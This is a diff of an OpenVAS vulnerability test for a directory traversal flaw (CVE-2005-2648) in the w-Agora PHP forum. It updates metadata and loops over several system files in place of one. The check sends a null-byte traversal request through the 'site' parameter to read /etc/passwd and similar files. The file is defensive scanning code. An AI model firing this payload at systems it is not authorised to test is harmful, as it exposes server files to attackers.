@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: w_agora_dir_traversal2.nasl 6053 2017-05-01 09:02:51Z teissa $
+# $Id: w_agora_dir_traversal2.nasl 11751 2018-10-04 12:03:41Z jschulte $
 # Description: w-Agora Site parameter remote directory traversal flaw
 #
 # Authors:
@@ -30,8 +30,8 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.19474");
-  script_version("$Revision: 6053 $");
-  script_tag(name:"last_modification", value:"$Date: 2017-05-01 11:02:51 +0200 (Mon, 01 May 2017) $");
+  script_version("$Revision: 11751 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-04 14:03:41 +0200 (Thu, 04 Oct 2018) $");
   script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
   script_cve_id("CVE-2005-2648");
   script_bugtraq_id(14597);
@@ -41,21 +41,17 @@ if(description)
   script_category(ACT_ATTACK);
   script_copyright("This script is Copyright (C) 2005 David Maciejak");
   script_family("Web application abuses");
-  script_dependencies("find_service.nasl", "http_version.nasl");
+  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
   script_require_ports("Services/www", 80);
   script_exclude_keys("Settings/disable_cgi_scanning");
 
-  tag_summary = "The remote host is running w-agora, a web-based forum management software
+  script_tag(name:"solution", value:"Upgrade to the newest version of this software");
+  script_tag(name:"summary", value:"The remote host is running w-agora, a web-based forum management software
   written in PHP.
 
   The remote version of this software is prone to directory traversal attacks.
   An attacker could send specially crafted URL to read arbitrary files on
-  the remote system with the privileges of the web server process.";
-
-  tag_solution = "Upgrade to the newest version of this software";
-
-  script_tag(name:"solution", value:tag_solution);
-  script_tag(name:"summary", value:tag_summary);
+  the remote system with the privileges of the web server process.");
 
   script_tag(name:"solution_type", value:"VendorFix");
   script_tag(name:"qod_type", value:"remote_vul");
@@ -65,19 +61,28 @@ if(description)
 
 include("http_func.inc");
 include("http_keepalive.inc");
+include("misc_func.inc");
 
 port = get_http_port( default:80 );
 if( ! can_host_php( port:port ) ) exit( 0 );
 
+files = traversal_files();
+
 foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {
 
   if( dir == "/" ) dir = "";
-  url = string( dir, "/index.php?site=../../../../../../../../etc/passwd%00" );
 
-  if( http_vuln_check( port:port, url:url, pattern:".*root:.*:0:[01]:.*" ) ) {
-    report = report_vuln_url( port:port, url:url );
-    security_message( port:port, data:report );
-    exit( 0 );
+  foreach pattern( keys( files ) ) {
+
+    file = files[pattern];
+
+    url = string( dir, "/index.php?site=../../../../../../../../" + file + "%00" );
+
+    if( http_vuln_check( port:port, url:url, pattern:pattern ) ) {
+      report = report_vuln_url( port:port, url:url );
+      security_message( port:port, data:report );
+      exit( 0 );
+    }
   }
 }
 
